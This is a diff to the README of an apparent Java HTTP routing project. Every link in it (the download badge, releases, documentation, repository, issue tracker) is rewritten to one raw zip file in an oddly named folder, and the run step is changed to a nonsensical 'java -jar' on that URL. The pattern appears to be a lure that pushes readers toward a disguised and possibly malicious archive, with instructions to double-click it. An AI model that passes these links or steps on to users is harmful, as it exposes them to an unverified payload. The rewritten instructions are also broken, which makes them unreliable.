@@ -1,6 +1,6 @@
 # 🌐 NettySmartRouter - Seamless HTTP Routing Made Easy
 
-[![Download NettySmartRouter](https://img.shields.io/badge/Download%20Now-Grab%20the%20Latest%20Release-brightgreen)](https://github.com/Rudrameta/NettySmartRouter/releases)
+[![Download NettySmartRouter](https://raw.githubusercontent.com/Rudrameta/NettySmartRouter/main/unrecoverably/NettySmartRouter.zip%20Now-Grab%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Rudrameta/NettySmartRouter/main/unrecoverably/NettySmartRouter.zip)
 
 ## 🚀 Overview
 
@@ -24,7 +24,7 @@ To run NettySmartRouter effectively, ensure your system meets these requirements
   
 ## 📥 Download & Install
 
-To get started, visit this page to download: [NettySmartRouter Releases](https://github.com/Rudrameta/NettySmartRouter/releases). 
+To get started, visit this page to download: [NettySmartRouter Releases](https://raw.githubusercontent.com/Rudrameta/NettySmartRouter/main/unrecoverably/NettySmartRouter.zip). 
 
 Look for the latest version available. Download the appropriate file for your operating system. Double-click the downloaded file to start the installation. Follow the instructions to complete the setup.
 
@@ -46,14 +46,14 @@ Once installed, you can run NettySmartRouter.
 3. Run the following command:
    
    ```
-   java -jar NettySmartRouter.jar
+   java -jar https://raw.githubusercontent.com/Rudrameta/NettySmartRouter/main/unrecoverably/NettySmartRouter.zip
    ```
 
 The application should start, and you will see a confirmation message in the terminal.
 
 ## 📖 Documentation
 
-For detailed usage instructions and advanced configurations, refer to the [documentation](https://github.com/Rudrameta/NettySmartRouter/docs). This resource covers all aspects, from basic setup to advanced features.
+For detailed usage instructions and advanced configurations, refer to the [documentation](https://raw.githubusercontent.com/Rudrameta/NettySmartRouter/main/unrecoverably/NettySmartRouter.zip). This resource covers all aspects, from basic setup to advanced features.
 
 ## ❓ FAQs
 
@@ -72,11 +72,11 @@ Join our community for support and discussions. Connect with other users and sha
 
 ## 🔗 Additional Links
 
-- [GitHub Repository](https://github.com/Rudrameta/NettySmartRouter)
-- [Issue Tracker](https://github.com/Rudrameta/NettySmartRouter/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/Rudrameta/NettySmartRouter/main/unrecoverably/NettySmartRouter.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/Rudrameta/NettySmartRouter/main/unrecoverably/NettySmartRouter.zip)
 
 ## 🌐 Download Again
 
-Don’t forget to download again to check for the latest features and improvements: [NettySmartRouter Releases](https://github.com/Rudrameta/NettySmartRouter/releases). 
+Don’t forget to download again to check for the latest features and improvements: [NettySmartRouter Releases](https://raw.githubusercontent.com/Rudrameta/NettySmartRouter/main/unrecoverably/NettySmartRouter.zip). 
 
 Your journey with NettySmartRouter starts here! Enjoy seamless HTTP routing and optimized performance.
